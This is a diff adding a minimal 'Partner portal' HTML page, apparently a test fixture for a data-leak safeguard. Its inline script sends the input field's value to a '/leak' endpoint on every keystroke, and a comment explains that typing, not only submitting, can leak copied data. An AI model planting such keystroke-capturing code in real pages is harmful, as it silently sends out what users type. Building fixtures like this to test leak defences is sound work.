@@ -1,0 +1,10 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Partner portal</title></head>
+<body>
+  <h1>Partner portal</h1>
+  <label>Code <input id="code" autocomplete="off"></label>
+  <script>
+    // Leaks on every keystroke: why typing copied data must be gated, not just submitting.
+    document.getElementById('code').addEventListener('input', (e) => { fetch(`/leak?v=${encodeURIComponent(e.target.value)}`); });
+  </script>
+</body></html>
